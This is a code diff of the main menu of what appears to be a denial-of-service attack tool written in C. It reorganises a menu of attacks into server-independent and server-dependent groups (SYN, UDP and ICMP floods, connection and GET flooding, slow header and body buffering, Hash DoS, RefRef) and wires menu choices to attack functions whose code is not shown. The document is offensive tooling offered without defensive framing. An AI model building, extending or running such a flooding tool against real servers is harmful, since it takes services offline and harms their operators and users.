@@ -6,6 +6,8 @@
 #include "ddos/udp_flood.h"
 #include "ddos/conn_flood.h"
 #include "ddos/hash_dos.h"
+#include "ddos/header_buffering.h"
+#include "ddos/body_buffering.h"
 
 #define __SIZE_OF_INPUT__ 200
 #define __MAX_TOKEN_NUM__ 20
@@ -48,15 +50,16 @@ int choose_running_type() {
 }
 
 int type_choose_menu() {
-	printf("=====================\n");
-	printf("1. Header buffering\n"
-			"2. Body buffering\n"
-			"3. Response buffering\n"
-			"4. Connection flooding\n"
+	printf("==Server Independent==\n");
+	printf("1. SYN flooding\n"
+			"2. UDP flooding\n"
+			"3. ICMP flooding\n"
+			"4. Connection flooding\n\n"
+			"==Server Dependent==\n"
 			"5. Get flooding\n"
-			"6. SYN flooding\n"
-			"7. UDP flooding\n"
-			"8. ICMP flooding\n"
+			"6. Header buffering\n"
+			"7. Body buffering\n"
+			"8. Response buffering\n"
 			"9. Hash Dos\n"
 			"10. RefRef\n");
 
@@ -79,11 +82,25 @@ int main(void) {
 		int type = type_choose_menu();
 
 		switch (type) {
-		case 1:		//header buffering
-			break; 
-		case 2:		//body buffering
-			break; 
-		case 3:		//response buffering
+		case 1:		//syn flooding
+			mode = choose_running_type();
+			syn_flood_print_usage(mode);
+			get_input();
+			make_tokens();
+			syn_flood_run(tokens, mode);
+			break;
+		case 2:		//UDP flooding
+			udp_flood_print_usage();
+			get_input();
+			make_tokens();
+			udp_flood_run(tokens);
+			break;
+		case 3:		//ICMP flooding
+			mode = choose_running_type();
+			icmp_flood_print_usage(mode);
+			get_input();
+			make_tokens();
+			icmp_flood_run(tokens, mode);
 			break; 
 		case 4:		//connection flooding
 			mode = choose_running_type();
@@ -99,25 +116,19 @@ int main(void) {
 			make_tokens();
 			get_flood_run(tokens,mode);
 			break; 
-		case 6:
-			mode = choose_running_type();
-			syn_flood_print_usage(mode);
+		case 6: //header buffering
+			header_buffering_print_usage(1);
 			get_input();
 			make_tokens();
-			syn_flood_run(tokens, mode);
+			header_buffering_run(tokens,1);
 			break;
-		case 7:		//UDP flooding
-			udp_flood_print_usage();
+		case 7:		//body buffering
+			body_buffering_print_usage(1);
 			get_input();
 			make_tokens();
-			udp_flood_run(tokens);
-			break; 
-		case 8:		//ICMP flooding
-			mode = choose_running_type();
-			icmp_flood_print_usage(mode);
-			get_input();
-			make_tokens();
-			icmp_flood_run(tokens, mode);
+			body_buffering_run(tokens,1);
+			break;
+		case 8:		//response buffering
 			break; 
 		case 9:		//Hash Dos
 			hash_dos_print_usage();
